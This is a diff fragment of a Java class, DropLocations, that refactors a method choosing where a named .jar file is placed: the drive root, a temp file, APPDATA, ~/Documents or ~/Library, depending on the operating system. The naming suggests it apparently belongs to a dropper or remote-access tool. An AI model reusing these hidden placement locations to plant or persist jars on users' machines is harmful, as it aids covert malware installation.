@@ -18,25 +18,25 @@ public class DropLocations {
 	
 	public static File getFile(int i, String fileName) throws Exception {
 		File file = null;
-				
+
 		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
-		
+
 		if (i == 0 || os.getType() == OperatingSystem.WINDOWS && ((WindowsOperatingSystem) os).getVersion() == WindowsVersion.WINXP) {
-			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+			if (os.getType() == OperatingSystem.WINDOWS) {
 				file = new File("C:\\" + fileName + ".jar");
 			} else {
 				file = new File("/" + fileName + ".jar");
 			}
 		} else if (i == 1) {
-			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+			if (os.getType() == OperatingSystem.WINDOWS) {
 				file = File.createTempFile(fileName, ".jar");
 			} else {
 				file = new File(System.getProperty("user.home") + "/Documents/" + fileName + ".jar");
 			}
-		} else if (i == 2) {
-			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+		} else if (i == 2) {			
+			if (os.getType() == OperatingSystem.WINDOWS) {
 				file = new File(System.getenv("APPDATA") + "\\" + fileName + ".jar");
-			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
+			} else if (os.getType() == OperatingSystem.OSX) {
 				file = new File(System.getProperty("user.home") + "/Library/" + fileName + ".jar");
 			} else {
 				file = File.createTempFile(fileName, ".jar");
